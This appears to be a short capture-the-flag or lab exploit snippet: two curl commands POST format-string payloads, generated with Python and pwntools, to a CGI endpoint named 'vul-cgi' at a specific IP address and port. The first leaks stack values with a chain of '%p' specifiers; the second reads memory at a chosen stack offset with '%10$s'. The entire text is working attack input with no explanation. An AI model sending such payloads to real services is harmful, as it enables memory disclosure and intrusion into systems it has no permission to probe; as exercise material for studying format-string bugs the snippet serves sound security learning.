curl -X POST -d "NAME=`python -c 'from pwn import *;print  "%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p"'`" http://140.115.59.92:10201/vul-cgi

curl -X POST -d "NAME=`python -c 'from pwn import *;print  "%10$s"'`" http://140.115.59.92:10201/vul-cgi
